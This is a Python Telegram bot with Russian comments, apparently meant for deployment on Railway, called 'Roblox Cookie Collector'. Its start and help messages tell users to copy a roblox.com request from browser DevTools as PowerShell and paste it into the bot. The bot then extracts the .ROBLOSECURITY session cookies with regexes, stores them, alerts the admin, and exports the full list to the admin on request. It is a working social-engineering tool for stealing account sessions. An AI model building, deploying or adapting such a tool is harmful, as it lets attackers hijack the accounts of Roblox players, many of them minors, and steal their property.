import os
import re
import logging
import json
from datetime import datetime
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# ========== НАСТРОЙКИ ==========
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Получаем настройки из переменных окружения Railway
BOT_TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_ID = os.environ.get("ADMIN_ID", "")

if not BOT_TOKEN:
    logger.error("❌ ОШИБКА: BOT_TOKEN не установлен!")
    logger.info("📝 Установите в Railway Dashboard:")
    logger.info("1. Зайдите в ваш проект")
    logger.info("2. Нажмите 'Variables'")
    logger.info("3. Добавьте BOT_TOKEN и ADMIN_ID")
    exit(1)

# Файл для хранения куков
COOKIES_FILE = "cookies.json"

# ========== ФУНКЦИИ ДЛЯ РАБОТЫ С ФАЙЛАМИ ==========
def load_cookies():
    """Загружаем куки из файла"""
    try:
        if os.path.exists(COOKIES_FILE):
            with open(COOKIES_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
    except Exception as e:
        logger.error(f"Ошибка загрузки файла: {e}")
    return []

def save_cookies(cookies_list):
    """Сохраняем куки в файл"""
    try:
        with open(COOKIES_FILE, 'w', encoding='utf-8') as f:
            json.dump(cookies_list, f, ensure_ascii=False, indent=2)
    except Exception as e:
        logger.error(f"Ошибка сохранения: {e}")

# ========== КОМАНДЫ БОТА ==========
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик /start"""
    user = update.effective_user
    await update.message.reply_text(
        f"👋 *Привет, {user.first_name}!*\n\n"
        "🤖 *Roblox Cookie Collector*\n\n"
        "📋 *Как использовать:*\n"
        "1. F12 → Network → F5\n"
        "2. Найдите запрос к roblox.com\n"
        "3. ПКМ → Copy → Copy as PowerShell\n"
        "4. Отправьте текст мне\n\n"
        "⚙️ *Доступные команды:*\n"
        "/stats - статистика\n"
        "/export - экспорт куков (админ)\n"
        "/help - помощь\n\n"
        "⚠️ *Куки сохраняются на сервере!*",
        parse_mode='Markdown'
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик /help"""
    await update.message.reply_text(
        "📖 *Помощь по использованию:*\n\n"
        "🔍 *Как получить текст:*\n"
        "1. Откройте DevTools (F12)\n"
        "2. Вкладка Network\n"
        "3. Обновите страницу (F5)\n"
        "4. Найдите любой запрос к *roblox.com*\n"
        "5. Правой кнопкой → Copy → Copy as PowerShell\n"
        "6. Отправьте мне скопированный текст\n\n"
        "📄 *Пример правильного текста:*\n"
        "```\n"
        "$session.Cookies.Add((New-Object System.Net.Cookie(\".ROBLOSECURITY\", \"_|WARNING...\")))\n"
        "```\n\n"
        "📊 *Статистика:* /stats\n"
        "📁 *Экспорт:* /export (только админ)",
        parse_mode='Markdown'
    )

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик /stats"""
    cookies_list = load_cookies()
    user_id = update.effective_user.id
    
    # Считаем статистику
    total_cookies = len(cookies_list)
    user_cookies = len([c for c in cookies_list if c.get('user_id') == user_id])
    
    await update.message.reply_text(
        f"📊 *Статистика бота:*\n\n"
        f"👤 *Ваши куки:* {user_cookies}\n"
        f"👥 *Всего куков:* {total_cookies}\n"
        f"🆔 *Ваш ID:* `{user_id}`\n\n"
        f"🚀 *Бот работает на Railway*",
        parse_mode='Markdown'
    )

async def export_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик /export (только для админа)"""
    if str(update.effective_user.id) != ADMIN_ID:
        await update.message.reply_text("⛔ *Эта команда только для администратора!*", parse_mode='Markdown')
        return
    
    cookies_list = load_cookies()
    
    if not cookies_list:
        await update.message.reply_text("📭 *База куков пуста!*", parse_mode='Markdown')
        return
    
    # Создаем текстовый файл
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"cookies_export_{timestamp}.txt"
    
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(f"Roblox Cookies Export\n")
        f.write(f"Generated: {datetime.now()}\n")
        f.write(f"Total cookies: {len(cookies_list)}\n")
        f.write("="*60 + "\n\n")
        
        for idx, cookie_data in enumerate(cookies_list, 1):
            f.write(f"#{idx}\n")
            f.write(f"User ID: {cookie_data.get('user_id', 'N/A')}\n")
            f.write(f"Date: {cookie_data.get('timestamp', 'N/A')}\n")
            f.write(f"Cookie: {cookie_data.get('cookie', '')[:150]}...\n")
            f.write("-"*50 + "\n\n")
    
    # Отправляем файл
    with open(filename, 'rb') as f:
        await update.message.reply_document(
            document=f,
            filename=filename,
            caption=f"📁 *Экспортировано {len(cookies_list)} куков*",
            parse_mode='Markdown'
        )
    
    # Очищаем базу после экспорта (опционально)
    save_cookies([])
    os.remove(filename)

async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик /broadcast (админ)"""
    if str(update.effective_user.id) != ADMIN_ID:
        return
    
    if not context.args:
        await update.message.reply_text("Использование: `/broadcast ваш текст`", parse_mode='Markdown')
        return
    
    message_text = ' '.join(context.args)
    await update.message.reply_text(f"📢 *Рассылка начата:*\n{message_text}", parse_mode='Markdown')
    
    # Здесь можно добавить реальную рассылку по сохраненным ID пользователей

async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработка текстовых сообщений"""
    text = update.message.text
    user_id = update.effective_user.id
    username = update.effective_user.username or f"user_{user_id}"
    
    logger.info(f"Получено сообщение от {username} (ID: {user_id})")
    
    # Ищем .ROBLOSECURITY куки
    cookie_patterns = [
        r'_\|WARNING[^\s"\']+',
        r'\.ROBLOSECURITY["\']?\s*,\s*["\']([^"\']+)["\']',
        r'"\.ROBLOSECURITY":"([^"]+)"',
        r'cookie\s*[=:]\s*["\']([^"\']+)["\']',
    ]
    
    found_cookies = []
    for pattern in cookie_patterns:
        matches = re.findall(pattern, text, re.IGNORECASE)
        for match in matches:
            cookie_value = match if isinstance(match, str) else match[0] if match else ""
            if cookie_value and cookie_value.startswith('_|WARNING'):
                found_cookies.append(cookie_value)
    
    if not found_cookies:
        await update.message.reply_text(
            "❌ *Куки не найдены!*\n\n"
            "Убедитесь что текст содержит:\n"
            "• `.ROBLOSECURITY`\n"
            "• Куки начинающиеся на `_|WARNING`\n\n"
            "📋 Отправьте текст как есть, без изменений.",
            parse_mode='Markdown'
        )
        return
    
    # Загружаем существующие куки
    cookies_list = load_cookies()
    
    # Добавляем новые куки
    new_cookies_count = 0
    for cookie_value in found_cookies:
        # Проверяем, нет ли уже такого кука
        if not any(c.get('cookie') == cookie_value for c in cookies_list):
            cookies_list.append({
                'user_id': user_id,
                'username': username,
                'cookie': cookie_value,
                'timestamp': datetime.now().isoformat()
            })
            new_cookies_count += 1
    
    # Сохраняем обновленный список
    save_cookies(cookies_list)
    
    # Отправляем результат пользователю
    if new_cookies_count > 0:
        response = (
            f"✅ *Успешно!*\n\n"
            f"🍪 *Найдено новых куков:* {new_cookies_count}\n"
            f"📊 *Всего в базе:* {len(cookies_list)}\n\n"
            f"🔐 *Пример куки:*\n"
            f"`{found_cookies[0][:80]}...`"
        )
        
        # Уведомляем админа о новых куках
        if ADMIN_ID and str(user_id) != ADMIN_ID:
            try:
                admin_msg = (
                    f"🔔 *Новые куки!*\n\n"
                    f"👤 *От:* {username} (ID: {user_id})\n"
                    f"🍪 *Добавлено:* {new_cookies_count} куков\n"
                    f"📊 *Всего в базе:* {len(cookies_list)}"
                )
                await context.bot.send_message(
                    chat_id=ADMIN_ID,
                    text=admin_msg,
                    parse_mode='Markdown'
                )
            except Exception as e:
                logger.error(f"Ошибка уведомления админа: {e}")
    else:
        response = "ℹ️ *Эти куки уже были сохранены ранее.*"
    
    await update.message.reply_text(response, parse_mode='Markdown')

# ========== ЗАПУСК БОТА ==========
def main():
    """Основная функция запуска бота"""
    logger.info("🚀 Запуск Roblox Cookie Bot на Railway...")
    
    # Создаем Application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Добавляем обработчики команд
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("stats", stats_command))
    application.add_handler(CommandHandler("export", export_command))
    application.add_handler(CommandHandler("broadcast", broadcast_command))
    
    # Обработчик текстовых сообщений
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_message))
    
    # Запускаем бота
    logger.info("🤖 Бот успешно запущен и готов к работе!")
    application.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)

if __name__ == '__main__':
    main()